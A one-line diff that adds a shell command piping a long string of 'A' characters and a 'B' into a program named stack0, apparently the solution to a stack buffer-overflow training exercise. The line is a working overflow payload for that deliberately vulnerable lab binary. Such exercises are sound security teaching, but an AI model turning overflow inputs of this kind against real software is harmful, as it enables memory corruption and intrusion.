@@ -1,0 +1,1 @@
+python -c "print 'A'*0x4c + 'B'" | ./stack0
